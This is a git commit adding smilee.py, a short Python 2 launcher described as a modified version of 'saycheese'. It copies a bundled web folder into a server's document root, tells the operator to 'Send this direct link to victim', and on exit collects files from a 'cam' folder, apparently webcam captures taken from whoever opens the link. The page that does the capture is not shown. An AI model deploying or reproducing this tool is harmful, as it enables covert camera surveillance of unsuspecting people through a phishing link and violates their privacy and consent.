f084790cc44adc4e17962d3a63f2c1377d80b2da
Aman Rawat <35992750+theamanrawat@users.noreply.github.com>
2019-11-04 00:56:02 -0500

    Add files via upload

---
+++ smilee.py
@@ -0,0 +1,43 @@
+import os
+import sys
+import shutil
+import time
+
+def banner():
+	print "Smilee v-0.1 modifed version of saycheese"
+
+def input():
+	url = raw_input("	[+] Enter the your link: ")
+	print "	[+] Direct link : " + url + "/smilee/"
+	print "	[+] Send this direct link to victim [+] \n"
+	try:
+		while True:
+			pass
+
+	except KeyboardInterrupt:
+		print "	[+] Exiting tool please wait..."
+		if os.path.exists('output/cam') == True:
+			shutil.rmtree('output/cam')
+			dest1 = shutil.move("/var/www/html/smilee/cam", "output")
+			dest2 = shutil.rmtree("/var/www/html/smilee")
+			time.sleep(5)
+			sys.exit()
+
+
+		else:
+			dest1 = shutil.move("/var/www/html/smilee/cam", "output")
+			dest2 = shutil.rmtree("/var/www/html/smilee")
+			time.sleep(5)
+			sys.exit()
+			
+	
+def  function():
+	if os.path.exists('/var/www/html/smilee') != True:
+		dest = shutil.copytree("smilee/", "/var/www/html/smilee") 
+		input()
+	else:
+		input()
+	
+
+banner()
+function()
